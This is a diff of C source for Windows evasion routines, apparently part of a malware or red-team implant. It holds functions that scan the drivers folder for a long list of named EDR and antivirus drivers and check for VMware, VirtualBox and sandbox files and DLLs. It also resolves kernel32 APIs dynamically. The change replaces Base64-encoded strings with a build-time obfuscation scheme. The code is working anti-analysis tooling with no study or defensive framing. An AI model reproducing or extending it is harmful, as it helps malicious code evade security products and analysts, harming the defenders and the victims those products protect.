@@ -8,33 +8,9 @@
 // EDR Detection: Scan system driver directory for known EDR drivers
 bool DetS()
 {
-    const char *edrDriversEncoded[] = {
-        "YXRyc2Rmdy5zeXM=", "YXZndHB4ODYuc3lz", "YXZndHB4NjQuc3lz", "bmFzd1NQLnN5cw==",
-        "ZWRyc2Vuc29yLnN5cw==", "Q2FyYm9uQmxhY2tLLnN5cw==", "cGFyaXR5LnN5cw==", "Y2JrNy5zeXM=",
-        "Y2JzdHJlYW0uc3lz", "Y3NhY2VudHIuc3lz", "Y3NhZW5oLnN5cw==", "Y3NhcmVnLnN5cw==",
-        "Y3Nhc2NyLnN5cw==", "Y3NhYXYuc3lz", "Y3NhYW0uc3lz", "cnZzYXZkLnN5cw==",
-        "Y2ZybWQuc3lz", "Y21kY2Nhdi5zeXM=", "Y21kZ3VhcmQuc3lz", "Q21kTW5FZnMuc3lz",
-        "TXlETE1QRi5zeXM=", "aW0uc3lz", "Y3NhZ2VudC5zeXM=", "Q3liS2VybmVsVHJhY2tlci5zeXM=",
-        "Q1JFeGVjUHJldi5zeXM=", "Q3lPcHRpY3Muc3lz", "Q3lQcm90ZWN0RHJ2MzIuc3lz",
-        "Q3lQcm90ZWN0RHJ2NjQuc3lz", "Z3JvdW5kbGluZzMyLnN5cw==", "Z3JvdW5kbGluZzY0LnN5cw==",
-        "ZXNlbnNvci5zeXM=", "ZWRldm1vbi5zeXM=", "ZWhkcnYuc3lz", "RmVLZXJuLnN5cw==",
-        "V0ZQX01SVC5zeXM=", "eGZzZ2suc3lz", "ZnNhdHAuc3lz", "ZnNocy5zeXM=",
-        "SGV4aXNGU01vbml0b3Iuc3lz", "a2xpZmtzLnN5cw==", "a2xpZmFhLnN5cw==",
-        "S2xpZnNtLnN5cw==", "bWJhbXdhdGNob2cuc3lz", "bWZlYXNrbS5zeXM=",
-        "bWZlbmNmaWx0ZXIuc3lz", "UFNJTlBST0Muc3lz", "UFNJTkZJTEUuc3lz",
-        "YW1mc20uc3lz", "YW1tODY2MC5zeXM=", "YW1tNjQ2MC5zeXM=", "ZWF3LnN5cw==",
-        "U0FGRS5zeXM=", "U2VudGluZWxNb25pdG9yLnN5cw==", "U0FWT25BY2Nlc3Muc3lz",
-        "c2F2b25hY2Nlc3Muc3lz", "c2xkLnN5cw==", "cGdwd2RlZnMuc3lz",
-        "R0VQcm90ZWN0aW9uLnN5cw==", "ZGlmbHQuc3lz", "c3lzTW9uLnN5cw==",
-        "c3NyZnNmLnN5cw==", "ZW14ZHJ2Mi5zeXM=", "cmVnaG9vay5zeXM=",
-        "c3BiYmNkc3Iuc3lz", "YmhkcnZ4ODYuc3lz", "YmhkcnZ4NjQuc3lz",
-        "U0lTSVBTRmlsZUZpbHRlci5zeXM=", "c3ltZXZlbnQuc3lz",
-        "dnhmc3JlcC5zeXM=", "VmlydEZpbGUuc3lz", "U3ltQUZSLnN5cw==",
-        "c3ltZWZhc2kuc3lz", "c3ltZWZhLnN5cw==", "c3ltZWZhNjQuc3lz",
-        "U3ltSHNtLnN5cw==", "ZXZtZi5zeXM=", "R0VGQ01QLnN5cw==",
-        "VkZTRW5jLnN5cw==", "cGdwZnMuc3lz", "ZmVuY3J5LnN5cw==",
-        "c3ltcmcuc3lz", "bmRnZG1rLnN5cw==", "c3NmbW9ubS5zeXM=",
-        "ZGxwd3BkZmx0ci5zeXM="};
+    char *edrDriversEncoded[] = {
+        // exclusion of sld.sys
+        "[OBFS_ENC]atrsdfw.sys", "[OBFS_ENC]avgtpx86.sys", "[OBFS_ENC]avgtpx64.sys", "[OBFS_ENC]naswSP.sys", "[OBFS_ENC]edrsensor.sys", "[OBFS_ENC]CarbonBlackK.sys", "[OBFS_ENC]parity.sys", "[OBFS_ENC]cbk7.sys", "[OBFS_ENC]cbstream.sys", "[OBFS_ENC]csacentr.sys", "[OBFS_ENC]csaenh.sys", "[OBFS_ENC]csareg.sys", "[OBFS_ENC]csascr.sys", "[OBFS_ENC]csaav.sys", "[OBFS_ENC]csaam.sys", "[OBFS_ENC]rvsavd.sys", "[OBFS_ENC]cfrmd.sys", "[OBFS_ENC]cmdccav.sys", "[OBFS_ENC]cmdguard.sys", "[OBFS_ENC]CmdMnEfs.sys", "[OBFS_ENC]MyDLMPF.sys", "[OBFS_ENC]im.sys", "[OBFS_ENC]csagent.sys", "[OBFS_ENC]CybKernelTracker.sys", "[OBFS_ENC]CRExecPrev.sys", "[OBFS_ENC]CyOptics.sys", "[OBFS_ENC]CyProtectDrv32.sys", "[OBFS_ENC]CyProtectDrv64.sys", "[OBFS_ENC]groundling32.sys", "[OBFS_ENC]groundling64.sys", "[OBFS_ENC]esensor.sys", "[OBFS_ENC]edevmon.sys", "[OBFS_ENC]ehdrv.sys", "[OBFS_ENC]FeKern.sys", "[OBFS_ENC]WFP_MRT.sys", "[OBFS_ENC]xfsgk.sys", "[OBFS_ENC]fsatp.sys", "[OBFS_ENC]fshs.sys", "[OBFS_ENC]HexisFSMonitor.sys", "[OBFS_ENC]klifks.sys", "[OBFS_ENC]klifaa.sys", "[OBFS_ENC]Klifsm.sys", "[OBFS_ENC]mbamwatchog.sys", "[OBFS_ENC]mfeaskm.sys", "[OBFS_ENC]mfencfilter.sys", "[OBFS_ENC]PSINPROC.sys", "[OBFS_ENC]PSINFILE.sys", "[OBFS_ENC]amfsm.sys", "[OBFS_ENC]amm8660.sys", "[OBFS_ENC]amm6460.sys", "[OBFS_ENC]eaw.sys", "[OBFS_ENC]SAFE.sys", "[OBFS_ENC]SentinelMonitor.sys", "[OBFS_ENC]SAVOnAccess.sys", "[OBFS_ENC]savonaccess.sys", "[OBFS_ENC]pgpwdefs.sys", "[OBFS_ENC]GEProtection.sys", "[OBFS_ENC]diflt.sys", "[OBFS_ENC]sysMon.sys", "[OBFS_ENC]ssrfsf.sys", "[OBFS_ENC]emxdrv2.sys", "[OBFS_ENC]reghook.sys", "[OBFS_ENC]spbbcdsr.sys", "[OBFS_ENC]bhdrvx86.sys", "[OBFS_ENC]bhdrvx64.sys", "[OBFS_ENC]SISIPSFileFilter.sys", "[OBFS_ENC]symevent.sys", "[OBFS_ENC]vxfsrep.sys", "[OBFS_ENC]VirtFile.sys", "[OBFS_ENC]SymAFR.sys", "[OBFS_ENC]symefasi.sys", "[OBFS_ENC]symefa.sys", "[OBFS_ENC]symefa64.sys", "[OBFS_ENC]SymHsm.sys", "[OBFS_ENC]evmf.sys", "[OBFS_ENC]GEFCMP.sys", "[OBFS_ENC]VFSEnc.sys", "[OBFS_ENC]pgpfs.sys", "[OBFS_ENC]fencry.sys", "[OBFS_ENC]symrg.sys", "[OBFS_ENC]ndgdmk.sys", "[OBFS_ENC]ssfmonm.sys", "[OBFS_ENC]dlpwpdfltr.sys"};
 
     WIN32_FIND_DATAA findFileData;
     HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\drivers\\*.sys", &findFileData);
@@ -46,7 +22,7 @@ bool DetS()
     {
         for (int i = 0; i < sizeof(edrDriversEncoded) / sizeof(edrDriversEncoded[0]); i++)
         {
-            char *decodedDriver = Bsfd(edrDriversEncoded[i]); // Decode Path
+            char *decodedDriver = obfs_decode(DECKEY, edrDriversEncoded[i]); // Decode Path
             if (!decodedDriver)
                 continue;
             if (StrStrIA(findFileData.cFileName, decodedDriver))
@@ -81,7 +57,7 @@ bool DetSl()
     return false;
 }
 
-// Sandbox Detection files using Base64 Encoding
+// Sandbox Detection files
 bool DetSBF()
 {
 
@@ -89,30 +65,29 @@ bool DetSBF()
     if (!pPathFileExistsA)
         return false;
 
-    // Base64 Encoded Paths
-    const char *encodedPaths[] = {
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXFZtbW91c2Uuc3lz",     // Vmmouse.sys
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtM2RnbC5kbGw=",     // vm3dgl.dll
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtZHVtLmRsbA==",     // vmdum.dll
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtM2R2ZXIuZGxs",     // vm3dver.dll
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtdHJheS5kbGw=",     // vmtray.dll
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtY2kuc3lz",         // vmci.sys
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtdXNibW91c2Uuc3lz", // vmusbmouse.sys
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZteF9zdmdhLnN5cw==", // vmx_svga.sys
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZteG5ldC5zeXM=",     // vmxnet.sys
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94R3Vlc3Quc3lz",             // VBoxGuest.sys
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94U0Yuc3lz",                 // VBoxSF.sys
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94VmlkZW8uc3lz",             // VBoxVideo.sys
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94U2VydmljZS5leGU=",         // VBoxService.exe
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94VHJheS5leGU=",             // VBoxTray.exe
-        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94Q29udHJvbC5leGU="          // VBoxControl.exe
+    char *encodedPaths[] = {
+        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\Vmmouse.sys",
+        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vm3dgl.dll",
+        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmdum.dll",
+        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vm3dver.dll",
+        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmtray.dll",
+        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmci.sys",
+        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmusbmouse.sys",
+        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmx_svga.sys",
+        "[OBFS_ENC]C:\\Windows\\System32\\drivers\\vmxnet.sys",
+        "[OBFS_ENC]C:\\Windows\\System32\\VBoxGuest.sys",
+        "[OBFS_ENC]C:\\Windows\\System32\\VBoxSF.sys",
+        "[OBFS_ENC]C:\\Windows\\System32\\VBoxVideo.sys",
+        "[OBFS_ENC]C:\\Windows\\System32\\VBoxService.exe",
+        "[OBFS_ENC]C:\\Windows\\System32\\VBoxTray.exe",
+        "[OBFS_ENC]C:\\Windows\\System32\\VBoxControl.exe"
     };
 
     int numPaths = sizeof(encodedPaths) / sizeof(encodedPaths[0]);
 
     for (int i = 0; i < numPaths; i++)
     {
-        char *decodedPath = Bsfd(encodedPaths[i]); // Decode Path
+        char *decodedPath = obfs_decode(DECKEY, encodedPaths[i]); // Decode Path
         if (!decodedPath)
             continue;
 
@@ -132,19 +107,19 @@ bool DetSBF()
 bool DetF()
 {
     // Get a pointer to GetProcAddress
-    pModC pGetProcAddress = (pModC)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("R2V0UHJvY0FkZHJlc3M="));
+    pModC pGetProcAddress = (pModC)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetProcAddress"));
     // Get a pointer to GetModuleHandleA
-    pMod pGetModuleHandleA = (pMod)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("R2V0TW9kdWxlSGFuZGxlQQ=="));
+    pMod pGetModuleHandleA = (pMod)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]GetModuleHandleA"));
 
     // Resolve Kernel32 base
-    HMODULE hKernel32 = (HMODULE)pGetModuleHandleA(Bsfd("a2VybmVsMzIuZGxs"));
+    HMODULE hKernel32 = (HMODULE)pGetModuleHandleA(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"));
 
     // Resolve API functions dynamically
-    FARPROC pGetModuleFileNameA = pGetProcAddress(hKernel32, Bsfd("R2V0TW9kdWxlRmlsZU5hbWVB")); // GetModuleFileNameA
-    pCreateFileA_t pCreateFileA = (pCreateFileA_t)pGetProcAddress(hKernel32, Bsfd("Q3JlYXRlRmlsZUE=")); // CreateFileA
-    pGetFileSize_t pGetFileSize = (pGetFileSize_t)pGetProcAddress(hKernel32, Bsfd("R2V0RmlsZVNpemU=")); // GetFileSize
-    pReadFile_t pReadFile = (pReadFile_t)pGetProcAddress(hKernel32, Bsfd("UmVhZEZpbGU=")); // ReadFile
-    pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(Bsfd("a2VybmVsMzIuZGxs"), "CloseHandle");
+    FARPROC pGetModuleFileNameA = pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]GetModuleFileNameA"));
+    pCreateFileA_t pCreateFileA = (pCreateFileA_t)pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]CreateFileA"));
+    pGetFileSize_t pGetFileSize = (pGetFileSize_t)pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]GetFileSize"));
+    pReadFile_t pReadFile = (pReadFile_t)pGetProcAddress(hKernel32, obfs_decode(DECKEY, "[OBFS_ENC]ReadFile"));
+    pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
 
     // Ensure all function pointers are valid
     if (!pGetModuleFileNameA || !pCreateFileA || !pGetFileSize || !pReadFile  || !pCloseHandle)
@@ -220,34 +195,33 @@ bool DetF()
 // Detect SandBox DLLs
 bool DetSBD()
 {
-    // Base64 Encoded DLLs (obfuscated)
-    const char *encoded_realDLLs[] = {
-        "a2VybmVsMzIuZGxs",             // kernel32.dll
-        "bmV0d29ya2V4cGxvcmVyLmRsbA==", // networkexplorer.dll
-        "TmxzRGF0YTAwMDAuZGxs"          // NlsData0000.dll
+    char *encoded_realDLLs[] = {
+        "[OBFS_ENC]kernel32.dll",
+        "[OBFS_ENC]networkexplorer.dll",
+        "[OBFS_ENC]NlsData0000.dll"
     };
 
-    const char *encoded_sandboxDLLs[] = {
-        "Y21kdnJ0LjMyLmRsbA==", // cmdvrt.32.dll
-        "Y3Vja29vbW9uLmRsbA==", // cuckoomon.dll
-        "Y21kdnJ0LjY0LmRsbA==", // cmdvrt.64.dll
-        "cHN0b3JlYy5kbGw=",     // pstorec.dll
-        "YXZnaG9va3guZGxs",     // avghookx.dll
-        "YXZnaG9va2EuZGxs",     // avghooka.dll
-        "c254aGsuc3lz",         // snxhk.dll
-        "YXBpX2xvZy5kbGw=",     // api_log.dll
-        "ZGlyX3dhdGNoLmRsbA==", // dir_watch.dll
-        "d3Blc3B5LmRsbA=="      // wpespy.dll
+    char *encoded_sandboxDLLs[] = {
+        "[OBFS_ENC]cmdvrt.32.dll",
+        "[OBFS_ENC]cuckoomon.dll",
+        "[OBFS_ENC]cmdvrt.64.dll",
+        "[OBFS_ENC]pstorec.dll",
+        "[OBFS_ENC]avghookx.dll",
+        "[OBFS_ENC]avghooka.dll",
+        "[OBFS_ENC]snxhk.dll",
+        "[OBFS_ENC]api_log.dll",
+        "[OBFS_ENC]dir_watch.dll",
+        "[OBFS_ENC]wpespy.dll"
     };
 
     // Get a pointer to GetModuleHandleA
-    pMod pGetModuleHandleA = (pMod)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("R2V0TW9kdWxlSGFuZGxlQQ==")); 
+    pMod pGetModuleHandleA = (pMod)GetMod("kernel32.dll", obfs_decode(DECKEY, "[OBFS_ENC]GetModuleHandleA")); 
     // Get a pointer to LoadLibraryA
-    pMod pLoadLibraryA = (pMod)GetMod(Bsfd("a2VybmVsMzIuZGxs"), Bsfd("TG9hZExpYnJhcnlB"));
+    pMod pLoadLibraryA = (pMod)GetMod("kernel32.dll", obfs_decode(DECKEY, "[OBFS_ENC]LoadLibraryA"));
 
     for (int i = 0; i < sizeof(encoded_realDLLs) / sizeof(encoded_realDLLs[0]); i++)
     {
-        char *decodedPath = Bsfd(encoded_realDLLs[i]);
+        char *decodedPath = obfs_decode(DECKEY, encoded_realDLLs[i]);
         HMODULE lib_inst = (HMODULE)pLoadLibraryA(decodedPath);
         if (lib_inst == NULL)
         {
@@ -261,7 +235,7 @@ bool DetSBD()
 
     for (int i = 0; i < sizeof(encoded_sandboxDLLs) / sizeof(encoded_sandboxDLLs[0]); i++)
     {
-        char *decodedPath = Bsfd(encoded_sandboxDLLs[i]);
+        char *decodedPath = obfs_decode(DECKEY, encoded_sandboxDLLs[i]);
         HMODULE lib_inst = (HMODULE)pGetModuleHandleA(decodedPath);
         if (lib_inst != NULL)
         {
